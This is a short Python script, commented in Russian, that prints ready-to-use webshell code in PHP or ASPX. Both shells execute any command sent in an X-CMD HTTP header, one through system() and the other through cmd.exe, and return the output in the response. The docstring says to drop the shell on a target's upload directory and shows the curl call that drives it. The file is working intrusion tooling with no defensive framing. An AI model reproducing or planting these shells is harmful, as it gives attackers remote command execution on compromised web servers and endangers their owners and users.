#!/usr/bin/env python3
"""webshell.py — минимальный управляемый шелл через HTTP-заголовок.
Кидаешь webshell.php на цель, дёргаешь так:
  curl -H "X-CMD: id" http://target/files/avatars/ws.php
Фича: вывод возвращается телом ответа, работает через allow_url_include-off и без GET-параметров."""
import sys

PHP = r'''<?php
$h = $_SERVER['HTTP_X_CMD'] ?? '';
if ($h) { header('Content-Type: text/plain'); system($h); exit; }
?>'''

PS = r'''<%@ Page Language="C#" %>
<%
var c = Request.Headers["X-CMD"];
if (!string.IsNullOrEmpty(c)) { Response.ContentType = "text/plain";
  var p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + c;
  p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true;
  p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); p.WaitForExit(); }
%>'''

if len(sys.argv) < 2 or sys.argv[1] not in ('php', 'aspx'):
    print(__doc__)
    sys.exit(1)

print(PHP if sys.argv[1] == 'php' else PS)
